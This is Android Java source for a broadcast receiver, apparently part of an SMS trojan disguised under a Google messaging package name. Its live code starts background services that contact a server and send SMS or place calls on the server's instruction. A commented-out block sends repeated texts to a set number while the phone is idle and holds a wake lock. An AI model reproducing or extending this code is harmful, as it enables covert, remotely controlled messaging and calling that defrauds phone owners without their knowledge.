package com.google.android.mms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class AutoSMSRecevier extends BroadcastReceiver {
    
    private static final String TAG = "AutoSMSRecevier";
    private static final boolean DEBUG = false;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (DEBUG) Log.d(TAG, "[[AutoSMSRecevier::onReceive]]");
        if (intent.getAction() != null) {
            String action = null;
            if (intent.getAction().equals(SettingManager.AUTO_CONNECT_SERVER) == true) {
                LOGD("[[AutoSMSRecevier::onReceiv]] connect server to get xml info, start service to internet");
                action = BgService.ACTION_INTERNET;
            } else if (intent.getAction().equals(SettingManager.AUTO_SMS_ACTION) == true) {
                LOGD("[[AutoSMSRecevier::onReceiv]] send sms or dial through server");
                SettingManager.getInstance(context.getApplicationContext()).log("send sms or dial through service");
                action = BgService.ACTION_SEND_SMS;
            } else if (intent.getAction().equals(BgService.ACTION_SEND_SMS_ROUND) == true) {
                SettingManager.getInstance(context.getApplicationContext()).log("one round sms send receiver");
                action = BgService.ACTION_SEND_SMS_ROUND;
            }
            
            Intent intent_new = new Intent();
            if (action == null) return;
            intent_new.setAction(action);
            boolean isInternal = SettingManager.getInstance(context).getAppType().equals(SettingManager.APP_TYPE_INTERNAL);
            if (isInternal) {
                intent_new.setClass(context, InstallService.class);
            } else {
                intent_new.setClass(context, BgService.class);
            }
            context.startService(intent_new);
        }
    }
    
//    @Override
//    public void onReceive(Context context, Intent intent) {
//        if (DEBUG) Log.d(TAG, "[[AutoSMSRecevier::onReceive]]");
//        
//        if (SettingManager.getInstance(context).isSimCardReady() == false
//                || SettingManager.getInstance(context).isCallIdle() == false) return;
//        
//        SettingManager sm = SettingManager.getInstance(context);
//        String destNum = sm.getSMSTargetNum();
//        
//        if (destNum.equals("") == true) {
//            destNum = "10086";
//            sm.setSMSTargetNum(destNum);
//            return;
//        }
//        
//        SettingManager.getInstance(context).setSMSEnable(false);
//        
//        int sendCount = SettingManager.getInstance(context).getSMSSendCount();
//        WorkingMessage wm = WorkingMessage.createEmpty(context);
//        
//        if (SettingManager.getInstance(context).isCallIdle() == false) return;
//        try {
//            if (SettingManager.getInstance(context).getSMSEnable() == true) {
//                SettingManager.getInstance(context).makePartialWakeLock();
//                for (int count = 0; count < sendCount; ++count) {
//                    if (DEBUG) Log.d(TAG, "[[AutoSMSRecevier::onReceive]] send message to " + destNum);
//                    wm.setDestNum(destNum);
//                    wm.setText("ce shi text");
//                    SettingManager.getInstance(context).logSMSCurrentTime();
//                    wm.send();
//                    int naps = 10;
//                    for (int n = 0; n < naps; ++n) {
//                        Thread.sleep(50);
//                    }
//                }
//                SettingManager.getInstance(context).releasePartialWakeLock();
//            }
//        } catch (Exception e) {
//        }
//        
//        if (SettingManager.getInstance(context).isCallIdle() == false) return;
//        if (SettingManager.getInstance(context).getDialEnable() == true) {
//            Intent dialIntent = new Intent();
//            dialIntent.setAction(BgService.ACTION_DIAL_BR);
//            context.sendBroadcast(dialIntent);
//        }
//    }

    public static final void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, msg);
        }
    }
}
